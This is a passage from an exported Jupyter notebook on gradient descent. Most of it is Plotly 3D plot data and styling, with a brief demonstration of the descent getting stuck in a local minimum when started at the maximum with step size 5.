0.00564964022487402, 0.0012435317039489746, 0.006751471199095249, 0.01482737809419632, 0.015410667285323143, 0.013213478960096836, 0.0138937933370471, 0.015515709295868874, 0.013366413302719593, 0.008946318179368973, 0.006029825191944838, 0.005286811385303736, 0.005605738610029221, 0.003994700964540243, 0.007865612395107746, 0.023953808471560478, 0.04246743768453598, 0.050089363008737564, 0.047297053039073944, 0.04589949920773506, 0.05558069795370102], [-0.006195694673806429, -0.00559283047914505, 0.0016715696547180414, 0.005379856564104557, 0.006055162288248539, 0.009467480704188347, 0.008772740140557289, 0.0020703680347651243, -0.0060302033089101315, -0.00875343382358551, -0.010311868041753769, -0.013396522961556911, -0.018363339826464653, -0.01878485083580017, -0.014106682501733303, -0.0046235970221459866, 0.0045376988127827644, 0.014722402207553387, 0.020193301141262054, 0.021849073469638824, 0.02574899047613144, 0.02983454056084156, 0.027460845187306404, 0.021206814795732498, 0.0204613134264946, 0.023990528658032417, 0.0276810210198164, 0.02690277434885502, 0.018687715753912926, 0.010244923643767834, 0.004897584207355976, 0.009693787433207035, 0.016717985272407532, 0.021082613617181778, 0.01823389157652855, 0.014684665948152542, 0.010988222435116768, 0.012327782809734344, 0.012878411449491978, 0.011927604675292969, 0.00831935741007328, 0.008170956745743752, 0.00886457972228527, 0.012635285966098309, 0.023774638772010803, 0.03852448984980583, 0.046821802854537964, 0.04465729370713234, 0.04461410269141197, 0.05257171392440796], [0.0018808860331773758, 0.0019585697446018457, 0.008154749870300293, 0.008944493718445301, 0.0069402847439050674, 0.01066309493035078, 0.010365244932472706, 0.0029840583447366953, -0.004019689746201038, -0.0033566139172762632, -0.0029567736200988293, -0.0055143809877336025, -0.011374132707715034, -0.013735143467783928, -0.012482083402574062, -0.00599979842081666, 0.0042133149690926075, 0.01754583977162838, 0.025486858561635017, 0.026583367958664894, 0.031192008405923843, 0.038212329149246216, 0.037739794701337814, 0.0328175388276577, 0.03284831345081329, 0.03626297414302826, 0.038896963000297546, 0.03560619428753853, 0.025492772459983826, 0.015785949304699898, 0.010802838020026684, 0.014356289058923721, 0.018724408000707626, 0.023083969950675964, 0.02059832401573658, 0.017220670357346535, 0.012571802362799644, 0.014018772169947624, 0.014667212031781673, 0.012330997735261917, 0.007285116706043482, 0.008469444699585438, 0.014001349918544292, 0.021537568420171738, 0.02917000837624073, 0.03897835686802864, 0.044532373547554016, 0.04317669942975044, 0.044465817511081696, 0.05111240968108177], [0.0031087370589375496, 0.0033785162959247828, 0.009885755367577076, 0.011391923762857914, 0.00971985049545765, 0.012831372208893299, 0.01318634394556284, 0.0076056052930653095, 0.0018704666290432215, 0.004094247706234455, 0.006303244270384312, 0.0040868474170565605, -0.001972807804122567, -0.005736948922276497, -0.010334383696317673, -0.010339722968637943, -0.0004949058638885617, 0.016028976067900658, 0.02759052813053131, 0.028793523088097572, 0.033206757158041, 0.04248784855008125, 0.045941464602947235, 0.04413601756095886, 0.043984346091747284, 0.0465397983789444, 0.04848543927073479, 0.043990567326545715, 0.0335182324051857, 0.023442450910806656, 0.018107911571860313, 0.01993544027209282, 0.021706342697143555, 0.024454912170767784, 0.02192358486354351, 0.01998448744416237, 0.01844925992190838, 0.020405856892466545, 0.018712561577558517, 0.014417611062526703, 0.009080134332180023, 0.011062839068472385, 0.018242770805954933, 0.028045253828167915, 0.03374601528048515, 0.03796112909913063, 0.03916620463132858, 0.041241373866796494, 0.04694007709622383, 0.05312880501151085], [0.0012528664665296674, 0.0008864431292749941, 0.007588230073451996, 0.012617615051567554, 0.013963158242404461, 0.016229121014475822, 0.017100287601351738, 0.01421851571649313, 0.008879815228283405, 0.010305278934538364, 0.012640978209674358, 0.0070013245567679405, -0.0003466681810095906, -0.002650606445968151, -0.006367804948240519, -0.007856319658458233, 0.0012663229135796428, 0.017492441460490227, 0.02868366427719593, 0.029507368803024292, 0.03257668763399124, 0.04273202270269394, 0.050096314400434494, 0.05137797072529793, 0.05004815757274628, 0.05124645307660103, 0.053739696741104126, 0.051434215158224106, 0.04264447093009949, 0.03268880397081375, 0.025583824142813683, 0.025594869628548622, 0.026236247271299362, 0.028268449008464813, 0.02570083923637867, 0.024752449244260788, 0.02629273571074009, 0.02783249318599701, 0.023056572303175926, 0.020230460911989212, 0.017892751842737198, 0.018676793202757835, 0.021028559654951096, 0.028471576049923897, 0.03395598754286766, 0.034668855369091034, 0.034145843237638474, 0.04268660768866539, 0.05489252507686615, 0.05953839793801308]]}], {\"scene\": {\"zaxis\": {\"range\": [-0.0994970053434372, 0.12291846424341202]}}, \"template\": {\"data\": {\"bar\": [{\"error_x\": {\"color\": \"#2a3f5f\"}, \"error_y\": {\"color\": \"#2a3f5f\"}, \"marker\": {\"line\": {\"color\": \"#E5ECF6\", \"width\": 0.5}}, \"type\": \"bar\"}], \"barpolar\": [{\"marker\": {\"line\": {\"color\": \"#E5ECF6\", \"width\": 0.5}}, \"type\": \"barpolar\"}], \"carpet\": [{\"aaxis\": {\"endlinecolor\": \"#2a3f5f\", \"gridcolor\": \"white\", \"linecolor\": \"white\", \"minorgridcolor\": \"white\", \"startlinecolor\": \"#2a3f5f\"}, \"baxis\": {\"endlinecolor\": \"#2a3f5f\", \"gridcolor\": \"white\", \"linecolor\": \"white\", \"minorgridcolor\": \"white\", \"startlinecolor\": \"#2a3f5f\"}, \"type\": \"carpet\"}], \"choropleth\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"type\": \"choropleth\"}], \"contour\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"colorscale\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]], \"type\": \"contour\"}], \"contourcarpet\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"type\": \"contourcarpet\"}], \"heatmap\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"colorscale\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]], \"type\": \"heatmap\"}], \"heatmapgl\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"colorscale\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]], \"type\": \"heatmapgl\"}], \"histogram\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"histogram\"}], \"histogram2d\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"colorscale\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]], \"type\": \"histogram2d\"}], \"histogram2dcontour\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"colorscale\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]], \"type\": \"histogram2dcontour\"}], \"mesh3d\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"type\": \"mesh3d\"}], \"parcoords\": [{\"line\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"parcoords\"}], \"pie\": [{\"automargin\": true, \"type\": \"pie\"}], \"scatter\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scatter\"}], \"scatter3d\": [{\"line\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scatter3d\"}], \"scattercarpet\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scattercarpet\"}], \"scattergeo\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scattergeo\"}], \"scattergl\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scattergl\"}], \"scattermapbox\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scattermapbox\"}], \"scatterpolar\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scatterpolar\"}], \"scatterpolargl\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scatterpolargl\"}], \"scatterternary\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scatterternary\"}], \"surface\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"colorscale\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]], \"type\": \"surface\"}], \"table\": [{\"cells\": {\"fill\": {\"color\": \"#EBF0F8\"}, \"line\": {\"color\": \"white\"}}, \"header\": {\"fill\": {\"color\": \"#C8D4E3\"}, \"line\": {\"color\": \"white\"}}, \"type\": \"table\"}]}, \"layout\": {\"annotationdefaults\": {\"arrowcolor\": \"#2a3f5f\", \"arrowhead\": 0, \"arrowwidth\": 1}, \"coloraxis\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"colorscale\": {\"diverging\": [[0, \"#8e0152\"], [0.1, \"#c51b7d\"], [0.2, \"#de77ae\"], [0.3, \"#f1b6da\"], [0.4, \"#fde0ef\"], [0.5, \"#f7f7f7\"], [0.6, \"#e6f5d0\"], [0.7, \"#b8e186\"], [0.8, \"#7fbc41\"], [0.9, \"#4d9221\"], [1, \"#276419\"]], \"sequential\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]], \"sequentialminus\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]]}, \"colorway\": [\"#636efa\", \"#EF553B\", \"#00cc96\", \"#ab63fa\", \"#FFA15A\", \"#19d3f3\", \"#FF6692\", \"#B6E880\", \"#FF97FF\", \"#FECB52\"], \"font\": {\"color\": \"#2a3f5f\"}, \"geo\": {\"bgcolor\": \"white\", \"lakecolor\": \"white\", \"landcolor\": \"#E5ECF6\", \"showlakes\": true, \"showland\": true, \"subunitcolor\": \"white\"}, \"hoverlabel\": {\"align\": \"left\"}, \"hovermode\": \"closest\", \"mapbox\": {\"style\": \"light\"}, \"paper_bgcolor\": \"white\", \"plot_bgcolor\": \"#E5ECF6\", \"polar\": {\"angularaxis\": {\"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\"}, \"bgcolor\": \"#E5ECF6\", \"radialaxis\": {\"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\"}}, \"scene\": {\"xaxis\": {\"backgroundcolor\": \"#E5ECF6\", \"gridcolor\": \"white\", \"gridwidth\": 2, \"linecolor\": \"white\", \"showbackground\": true, \"ticks\": \"\", \"zerolinecolor\": \"white\"}, \"yaxis\": {\"backgroundcolor\": \"#E5ECF6\", \"gridcolor\": \"white\", \"gridwidth\": 2, \"linecolor\": \"white\", \"showbackground\": true, \"ticks\": \"\", \"zerolinecolor\": \"white\"}, \"zaxis\": {\"backgroundcolor\": \"#E5ECF6\", \"gridcolor\": \"white\", \"gridwidth\": 2, \"linecolor\": \"white\", \"showbackground\": true, \"ticks\": \"\", \"zerolinecolor\": \"white\"}}, \"shapedefaults\": {\"line\": {\"color\": \"#2a3f5f\"}}, \"ternary\": {\"aaxis\": {\"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\"}, \"baxis\": {\"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\"}, \"bgcolor\": \"#E5ECF6\", \"caxis\": {\"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\"}}, \"title\": {\"x\": 0.05}, \"xaxis\": {\"automargin\": true, \"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\", \"title\": {\"standoff\": 15}, \"zerolinecolor\": \"white\", \"zerolinewidth\": 2}, \"yaxis\": {\"automargin\": true, \"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\", \"title\": {\"standoff\": 15}, \"zerolinecolor\": \"white\", \"zerolinewidth\": 2}}}, \"title\": {\"text\": \"Gradient Descent Steps\"}}, {\"responsive\": true} ) }; To demonstrate how gradient descent can be stuck, by setting the gradient descent algorithm to start a the maximum point with a step size of 5, we can see how it falls straight into the nearest ditch (local minima) but then cannot get out of it. In [18]: found_minimum , steps = gradient_descent_3d ( z , max_z_x_location , max_z_y_location , step_size = 5 , plot = True ) fig = generate_3d_plot ( steps ) HTML ( plotly . offline . plot ( fig , filename = 'maximum_starting_point_step_size_5_3d_gradient_descent.html' , include_plotlyjs = 'cdn' )) Converged in 3 steps Out[18]: window.PlotlyConfig = {MathJaxConfig: 'local'}; window.PLOTLYENV=window.PLOTLYENV || {}; if (document.getElementById(\"d4cf9d51-7e09-43ba-a047-131aefeaf818\")) { Plotly.newPlot( 'd4cf9d51-7e09-43ba-a047-131aefeaf818', [{\"anchor\": \"tail\", \"sizemode\": \"absolute\", \"sizeref\": 2, \"type\": \"cone\", \"u\": [-3, -1, 1, 0, 0.1], \"v\": [5, 5, 3, 0, 0.1], \"w\": [-0.06172552332282066, -0.0496413167566061, -0.02182125672698021, 0.0, 0.1], \"x\": [42, 39, 38, 39, 39], \"y\": [30, 35, 40, 43, 43], \"z\": [0.12291846424341202, 0.061192940920591354, 0.011551624163985252, -0.010269632562994957, -0.010269632562994957]}, {\"line\": {\"color\": \"red\", \"width\": 2}, \"mode\": \"lines\", \"type\": \"scatter3d\", \"x\": [42, 39, 38, 39, 39], \"y\": [30, 35, 40, 43, 43], \"z\": [0.12291846424341202, 0.061192940920591354, 0.011551624163985252, -0.010269632562994957, -0.010269632562994957]}, {\"colorscale\": [[0.0, \"rgb(51, 51, 153)\"], [0.003937007874015748, \"rgb(49, 53, 155)\"], [0.007874015748031496, \"rgb(48, 56, 158)\"], [0.011811023622047244, \"rgb(47, 59, 161)\"], [0.015748031496062992, \"rgb(45, 61, 163)\"], [0.01968503937007874, \"rgb(44, 64, 166)\"], [0.023622047244094488, \"rgb(43, 67, 169)\"], [0.027559055118110236, \"rgb(41, 69, 171)\"], [0.031496062992125984, \"rgb(40, 72, 174)\"], [0.03543307086614173, \"rgb(39, 75, 177)\"], [0.03937007874015748, \"rgb(37, 77, 179)\"], [0.04330708661417323, \"rgb(36, 80, 182)\"], [0.047244094488188976, \"rgb(35, 83, 185)\"], [0.051181102362204724, \"rgb(33, 85, 187)\"], [0.05511811023622047, \"rgb(32, 88, 190)\"], [0.05905511811023622, \"rgb(31, 91, 193)\"], [0.06299212598425197, \"rgb(29, 93, 195)\"], [0.06692913385826771, \"rgb(28, 96, 198)\"], [0.07086614173228346, \"rgb(27, 98, 201)\"], [0.07480314960629922, \"rgb(25, 101, 203)\"], [0.07874015748031496, \"rgb(24, 104, 206)\"], [0.0826771653543307, \"rgb(23, 107, 209)\"], [0.08661417322834646, \"rgb(21, 109, 211)\"], [0.09055118110236221, \"rgb(20, 112, 214)\"], [0.09448818897637795, \"rgb(19, 115, 217)\"], [0.09842519685039369, \"rgb(17, 117, 219)\"], [0.10236220472440945, \"rgb(16, 120, 222)\"], [0.1062992125984252, \"rgb(14, 123, 225)\"], [0.11023622047244094, \"rgb(13, 125, 227)\"], [0.11417322834645668, \"rgb(12, 128, 230)\"], [0.11811023622047244, \"rgb(11, 131, 233)\"], [0.1220472440944882, \"rgb(9, 133, 235)\"], [0.12598425196850394, \"rgb(8, 136, 238)\"], [0.12992125984251968, \"rgb(7, 138, 241)\"], [0.13385826771653542, \"rgb(5, 141, 243)\"], [0.1377952755905512, \"rgb(4, 144, 246)\"], [0.14173228346456693, \"rgb(3, 147, 249)\"], [0.14566929133858267, \"rgb(1, 149, 251)\"], [0.14960629921259844, \"rgb(0, 152, 254)\"], [0.15354330708661418, \"rgb(0, 154, 250)\"], [0.15748031496062992, \"rgb(0, 156, 244)\"], [0.16141732283464566, \"rgb(0, 158, 238)\"], [0.1653543307086614, \"rgb(0, 160, 232)\"], [0.16929133858267717, \"rgb(0, 162, 226)\"], [0.1732283464566929, \"rgb(0, 164, 220)\"], [0.17716535433070865, \"rgb(0, 166, 214)\"], [0.18110236220472442, \"rgb(0, 168, 208)\"], [0.18503937007874016, \"rgb(0, 170, 202)\"], [0.1889763779527559, \"rgb(0, 172, 196)\"], [0.19291338582677164, \"rgb(0, 174, 190)\"], [0.19685039370078738, \"rgb(0, 176, 184)\"], [0.20078740157480315, \"rgb(0, 178, 178)\"], [0.2047244094488189, \"rgb(0, 180, 172)\"], [0.20866141732283464, \"rgb(0, 182, 166)\"], [0.2125984251968504, \"rgb(0, 184, 160)\"], [0.21653543307086615, \"rgb(0, 186, 154)\"], [0.2204724409448819, \"rgb(0, 188, 148)\"], [0.22440944881889763, \"rgb(0, 190, 142)\"], [0.22834645669291337, \"rgb(0, 192, 136)\"], [0.23228346456692914, \"rgb(0, 194, 130)\"], [0.23622047244094488, \"rgb(0, 196, 124)\"], [0.24015748031496062, \"rgb(0, 198, 118)\"], [0.2440944881889764, \"rgb(0, 200, 112)\"], [0.24803149606299213, \"rgb(0, 202, 106)\"], [0.25196850393700787, \"rgb(1, 204, 102)\"], [0.2559055118110236, \"rgb(5, 205, 103)\"], [0.25984251968503935, \"rgb(8, 205, 103)\"], [0.2637795275590551, \"rgb(13, 206, 104)\"], [0.26771653543307083, \"rgb(17, 207, 105)\"], [0.27165354330708663, \"rgb(21, 208, 106)\"], [0.2755905511811024, \"rgb(25, 209, 107)\"], [0.2795275590551181, \"rgb(29, 209, 107)\"], [0.28346456692913385, \"rgb(33, 210, 108)\"], [0.2874015748031496, \"rgb(37, 211, 109)\"], [0.29133858267716534, \"rgb(40, 212, 110)\"], [0.2952755905511811, \"rgb(45, 213, 111)\"], [0.2992125984251969, \"rgb(49, 213, 111)\"], [0.3031496062992126, \"rgb(53, 214, 112)\"], [0.30708661417322836, \"rgb(57, 215, 113)\"], [0.3110236220472441, \"rgb(61, 216, 114)\"], [0.31496062992125984, \"rgb(65, 217, 115)\"], [0.3188976377952756, \"rgb(69, 217, 115)\"], [0.3228346456692913, \"rgb(72, 218, 116)\"], [0.32677165354330706, \"rgb(77, 219, 117)\"], [0.3307086614173228, \"rgb(81, 220, 118)\"], [0.3346456692913386, \"rgb(85, 221, 119)\"], [0.33858267716535434, \"rgb(89, 221, 119)\"], [0.3425196850393701, \"rgb(93, 222, 120)\"], [0.3464566929133858, \"rgb(97, 223, 121)\"], [0.35039370078740156, \"rgb(101, 224, 122)\"], [0.3543307086614173, \"rgb(104, 225, 122)\"], [0.35826771653543305, \"rgb(109, 225, 123)\"], [0.36220472440944884, \"rgb(113, 226, 124)\"], [0.3661417322834646, \"rgb(117, 227, 125)\"], [0.3700787401574803, \"rgb(121, 228, 126)\"], [0.37401574803149606, \"rgb(125, 229, 127)\"], [0.3779527559055118, \"rgb(129, 229, 127)\"], [0.38188976377952755, \"rgb(133, 230, 128)\"], [0.3858267716535433, \"rgb(136, 231, 129)\"], [0.38976377952755903, \"rgb(141, 232, 130)\"], [0.39370078740157477, \"rgb(145, 233, 131)\"], [0.39763779527559057, \"rgb(149, 233, 131)\"], [0.4015748031496063, \"rgb(153, 234, 132)\"], [0.40551181102362205, \"rgb(157, 235, 133)\"], [0.4094488188976378, \"rgb(161, 236, 134)\"], [0.41338582677165353, \"rgb(165, 237, 135)\"], [0.41732283464566927, \"rgb(168, 237, 135)\"], [0.421259842519685, \"rgb(173, 238, 136)\"], [0.4251968503937008, \"rgb(177, 239, 137)\"], [0.42913385826771655, \"rgb(181, 240, 138)\"], [0.4330708661417323, \"rgb(185, 241, 139)\"], [0.43700787401574803, \"rgb(189, 241, 139)\"], [0.4409448818897638, \"rgb(193, 242, 140)\"], [0.4448818897637795, \"rgb(197, 243, 141)\"], [0.44881889763779526, \"rgb(200, 244, 142)\"], [0.452755905511811, \"rgb(205, 245, 143)\"], [0.45669291338582674, \"rgb(209, 245, 143)\"], [0.46062992125984253, \"rgb(213, 246, 144)\"], [0.4645669291338583, \"rgb(217, 247, 145)\"], [0.468503937007874, \"rgb(221, 248, 146)\"], [0.47244094488188976, \"rgb(225, 249, 147)\"], [0.4763779527559055, \"rgb(229, 249, 147)\"], [0.48031496062992124, \"rgb(232, 250, 148)\"], [0.484251968503937, \"rgb(237, 251, 149)\"], [0.4881889763779528, \"rgb(241, 252, 150)\"], [0.4921259842519685, \"rgb(245, 253, 151)\"], [0.49606299212598426, \"rgb(249, 253, 151)\"], [0.5, \"rgb(254, 253, 152)\"], [0.5039370078740157, \"rgb(252, 251, 151)\"], [0.5078740157480315, \"rgb(250, 248, 150)\"], [0.5118110236220472, \"rgb(248, 246, 149)\"], [0.515748031496063, \"rgb(246, 243, 148)\"], [0.5196850393700787, \"rgb(244, 240, 147)\"], [0.5236220472440944, \"rgb(242, 238, 145)\"], [0.5275590551181102, \"rgb(240, 235, 144)\"], [0.5314960629921259, \"rgb(238, 233, 143)\"], [0.5354330708661417, \"rgb(236, 230, 142)\"], [0.5393700787401575, \"rgb(234, 228, 141)\"], [0.5433070866141733, \"rgb(232, 225, 140)\"], [0.547244094488189, \"rgb(230, 223, 139)\"], [0.5511811023622047, \"rgb(228, 220, 138)\"], [0.5551181102362205, \"rgb(226, 217, 137)\"], [0.5590551181102362, \"rgb(224, 215, 136)\"], [0.562992125984252, \"rgb(222, 212, 135)\"], [0.5669291338582677, \"rgb(220, 210, 134)\"], [0.5708661417322834, \"rgb(218, 207, 133)\"], [0.5748031496062992, \"rgb(216, 205, 131)\"], [0.5787401574803149, \"rgb(214, 202, 130)\"], [0.5826771653543307, \"rgb(211, 199, 129)\"], [0.5866141732283464, \"rgb(210, 197, 128)\"], [0.5905511811023622, \"rgb(208, 194, 127)\"], [0.5944881889763779, \"rgb(206, 192, 126)\"], [0.5984251968503937, \"rgb(204, 189, 125)\"], [0.6023622047244095, \"rgb(202, 187, 124)\"], [0.6062992125984252, \"rgb(200, 184, 123)\"], [0.610236220472441, \"rgb(198, 182, 122)\"], [0.6141732283464567, \"rgb(195, 179, 121)\"], [0.6181102362204725, \"rgb(194, 176, 120)\"], [0.6220472440944882, \"rgb(192, 174, 118)\"], [0.6259842519685039, \"rgb(190, 171, 117)\"], [0.6299212598425197, \"rgb(188, 169, 116)\"], [0.6338582677165354, \"rgb(186, 166, 115)\"], [0.6377952755905512, \"rgb(184, 164, 114)\"], [0.6417322834645669, \"rgb(182, 161, 113)\"], [0.6456692913385826, \"rgb(179, 159, 112)\"], [0.6496062992125984, \"rgb(178, 156, 111)\"], [0.6535433070866141, \"rgb(176, 153, 110)\"], [0.6574803149606299, \"rgb(174, 151, 109)\"], [0.6614173228346456, \"rgb(172, 148, 108)\"], [0.6653543307086615, \"rgb(170, 146, 107)\"], [0.6692913385826772, \"rgb(168, 143, 106)\"], [0.6732283464566929, \"rgb(166, 141, 104)\"], [0.6771653543307087, \"rgb(163, 138, 103)\"], [0.6811023622047244, \"rgb(162, 135, 102)\"], [0.6850393700787402, \"rgb(160, 133, 101)\"], [0.6889763779527559, \"rgb(158, 130, 100)\"], [0.6929133858267716, \"rgb(156, 128, 99)\"], [0.6968503937007874, \"rgb(154, 125, 98)\"], [0.7007874015748031, \"rgb(152, 123, 97)\"], [0.7047244094488189, \"rgb(150, 120, 96)\"], [0.7086614173228346, \"rgb(147, 118, 95)\"], [0.7125984251968503, \"rgb(146, 115, 94)\"], [0.7165354330708661, \"rgb(144, 112, 93)\"], [0.7204724409448818, \"rgb(142, 110, 91)\"], [0.7244094488188977, \"rgb(140, 107, 90)\"], [0.7283464566929134, \"rgb(138, 105, 89)\"], [0.7322834645669292, \"rgb(136, 102, 88)\"], [0.7362204724409449, \"rgb(134, 100, 87)\"], [0.7401574803149606, \"rgb(131, 97, 86)\"], [0.7440944881889764, \"rgb(130, 95, 85)\"], [0.7480314960629921, \"rgb(128, 92, 84)\"], [0.7519685039370079, \"rgb(129, 93, 86)\"], [0.7559055118110236, \"rgb(131, 96, 88)\"], [0.7598425196850394, \"rgb(133, 98, 91)\"], [0.7637795275590551, \"rgb(135, 101, 94)\"], [0.7677165354330708, \"rgb(136, 103, 96)\"], [0.7716535433070866, \"rgb(139, 106, 99)\"], [0.7755905511811023, \"rgb(141, 109, 102)\"], [0.7795275590551181, \"rgb(143, 111, 104)\"], [0.7834645669291338, \"rgb(145, 114, 107)\"], [0.7874015748031495, \"rgb(147, 116, 110)\"], [0.7913385826771654, \"rgb(149, 119, 112)\"], [0.7952755905511811, \"rgb(151, 121, 115)\"], [0.7992125984251969, \"rgb(153, 124, 118)\"], [0.8031496062992126, \"rgb(155, 127, 121)\"], [0.8070866141732284, \"rgb(157, 129, 123)\"], [0.8110236220472441, \"rgb(159, 132, 126)\"], [0.8149606299212598, \"rgb(161, 134, 129)\"], [0.8188976377952756, \"rgb(163, 137, 131)\"], [0.8228346456692913, \"rgb(165, 139, 134)\"], [0.8267716535433071, \"rgb(167, 142, 137)\"], [0.8307086614173228, \"rgb(168, 144, 139)\"], [0.8346456692913385, \"rgb(171, 147, 142)\"], [0.8385826771653543, \"rgb(173, 150, 145)\"], [0.84251968503937, \"rgb(175, 152, 147)\"], [0.8464566929133858, \"rgb(177, 155, 150)\"], [0.8503937007874016, \"rgb(179, 157, 153)\"], [0.8543307086614174, \"rgb(181, 160, 155)\"], [0.8582677165354331, \"rgb(183, 162, 158)\"], [0.8622047244094488, \"rgb(185, 165, 161)\"], [0.8661417322834646, \"rgb(187, 167, 163)\"], [0.8700787401574803, \"rgb(189, 170, 166)\"], [0.8740157480314961, \"rgb(191, 173, 169)\"], [0.8779527559055118, \"rgb(193, 175, 171)\"], [0.8818897637795275, \"rgb(195, 178, 174)\"], [0.8858267716535433, \"rgb(196, 180, 177)\"], [0.889763779527559, \"rgb(199, 183, 179)\"], [0.8937007874015748, \"rgb(200, 185, 182)\"], [0.8976377952755905, \"rgb(203, 188, 185)\"], [0.9015748031496063, \"rgb(205, 191, 187)\"], [0.905511811023622, \"rgb(207, 193, 190)\"], [0.9094488188976377, \"rgb(209, 196, 193)\"], [0.9133858267716535, \"rgb(211, 198, 196)\"], [0.9173228346456693, \"rgb(212, 201, 198)\"], [0.9212598425196851, \"rgb(215, 203, 201)\"], [0.9251968503937008, \"rgb(217, 206, 204)\"], [0.9291338582677166, \"rgb(219, 208, 206)\"], [0.9330708661417323, \"rgb(221, 211, 209)\"], [0.937007874015748, \"rgb(223, 214, 212)\"], [0.9409448818897638, \"rgb(225, 216, 214)\"], [0.9448818897637795, \"rgb(227, 219, 217)\"], [0.9488188976377953, \"rgb(228, 221, 220)\"], [0.952755905511811, \"rgb(231, 224, 222)\"], [0.9566929133858267, \"rgb(232, 226, 225)\"], [0.9606299212598425, \"rgb(235, 229, 228)\"], [0.9645669291338582, \"rgb(237, 231, 230)\"], [0.968503937007874, \"rgb(239, 234, 233)\"], [0.9724409448818897, \"rgb(241, 237, 236)\"], [0.9763779527559056, \"rgb(243, 239, 238)\"], [0.9803149606299213, \"rgb(244, 242, 241)\"], [0.984251968503937, \"rgb(247, 244, 244)\"], [0.9881889763779528, \"rgb(249, 247, 246)\"], [0.9921259842519685, \"rgb(251, 249, 249)\"], [0.9960629921259843, \"rgb(253, 252, 252)\"], [1.0, \"rgb(255, 255, 255)\"]], \"opacity\": 